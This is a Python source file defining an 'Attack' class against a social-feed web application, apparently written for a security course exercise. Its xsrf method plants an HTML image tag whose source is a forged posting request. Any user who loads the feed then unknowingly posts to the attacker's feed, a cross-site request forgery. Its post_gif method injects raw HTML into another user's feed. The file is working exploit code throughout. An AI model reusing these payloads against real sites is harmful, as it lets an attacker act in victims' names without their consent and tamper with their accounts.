from web_tools import *
import datetime
import requests
import urllib.parse


class Attack(Web_tools):


    @classmethod
    def xsrf(cls, target_screen_name = "nataliw4") -> None:
        # ---------------------------------------------- #
        # This function posts a glit on a given user's feed 
        # this glit will contain a url to a "photo" but  in fact it's url
        # to posting post on an attacker feed, when the user will load his fedd
        # he will post a post on my feed without even knowing
        # :param target_screen_name: the scree name of the target
        # :type target_screen_name: str
        # :return: none
        # ---------------------------------------------- #

        target_id = super().get_id(target_screen_name)
        url = super()._post_url
        date = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")
        xsrf_url = f"{url}?id=-1&feed_owner_id={super().server_session.id}&publisher_id={target_id}&publisher_screen_name={target_id}&publisher_avatar=im1&background_color=White&date={date}&content=cyber%20cyber&font_color=black"
        xsrf_url = urllib.parse.quote(xsrf_url)
        post_content = f'<img src = {xsrf_url}>Hi :D'
        post_url = f"{url}?id=-1&feed_owner_id={target_id}&publisher_id={super().server_session.id}&publisher_screen_name={super()._username}&publisher_avatar=im1&background_color=White&date={date}&content={post_content}&font_color=black"
        ans = super().server_session.session.get(post_url)
        print(f"[SERVER RESPONSE] {ans.text}")


    @classmethod
    def post_gif(cls, target_screen_name = "nataliw1") -> None:
        # ---------------------------------------------- #
        # This function will post a gif (rick roll gif) on someone's feed
        # :param target_screen_name: the scree name of the target
        # :type target_screen_name: str
        # :return: none
        # ---------------------------------------------- #

        target_id = super().get_id(target_screen_name)
        url = super()._post_url
        date = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%SZ")
        gif_url = '<img src="https://i.gifer.com/4KI.gif ">'
        gif_url = urllib.parse.quote(gif_url)
        post_url = f"{url}?id=-1&feed_owner_id={target_id}&publisher_id={super().server_session.id}&publisher_screen_name={super()._username}&publisher_avatar=im1&background_color=White&date={date}&content={gif_url}&font_color=black"
        ans = super().server_session.session.get(post_url)
        print(f"[SERVER RESPONSE] {ans.text}")
